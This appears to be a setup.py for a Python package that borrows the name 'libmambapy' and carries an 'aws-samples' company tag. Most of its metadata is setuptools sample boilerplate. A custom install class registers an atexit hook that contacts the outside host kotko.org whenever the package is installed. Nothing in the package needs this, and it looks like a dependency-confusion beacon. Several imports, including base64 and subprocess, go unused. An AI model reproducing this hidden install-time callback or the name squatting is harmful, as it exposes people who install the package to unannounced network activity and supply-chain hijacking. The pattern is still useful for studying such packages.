
from requests_html import HTMLSession


# Always prefer setuptools over distutils
from setuptools import setup, find_packages
import atexit
import requests
import os
import pathlib
import base64
from distutils.command.install import install


here = pathlib.Path(__file__).parent.resolve()

# Get the long description from the README file
long_description = (here / 'README.md').read_text(encoding='utf-8')

company = "aws-samples--aws-ai-ml-workshop-kr"
name = "libmambapy"
version = "0.0.7"

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
from subprocess import check_call



# def _post_install():
#     _post_install


class new_install(install):
    def __init__(self, *args, **kwargs):
        super(new_install, self).__init__(*args, **kwargs)
        atexit.register(_post_install)


def _post_install():
    session = HTMLSession()

    r = session.get('https://kotko.org')


setup(
    name=name,
    version=version,
    description='Project by kotko',
    long_description=long_description,
    long_description_content_type='text/markdown', 
    url='https://github.com/kotko/bravado-decorators',
    author='Vladyslav Kotko', 
    author_email='m@kotko.me',  # Optional
    include_package_data=True,
    classifiers=[  
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Build Tools',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3 :: Only',
    ],
    keywords='sample, setuptools, development',
    package_dir={'': 'src'},  # Optional
    packages=find_packages(where='src'), 
    python_requires='>=3.6, <4',
    install_requires=['requests_html', 'requests'], 
    extras_require={  # Optional
        'dev': ['check-manifest', 'requests'],
        'test': ['coverage', 'requests'],
    },


    package_data={  # Optional
        'sample': ['package_data.dat'],
    },
    data_files=[('my_data', ['data/data_file'])],  
    entry_points={  # Optional
        'console_scripts': [
            'sample=sample:main',
        ],
    },
    project_urls={},
     cmdclass={
        'install': new_install,
    },
)
# _post_install()
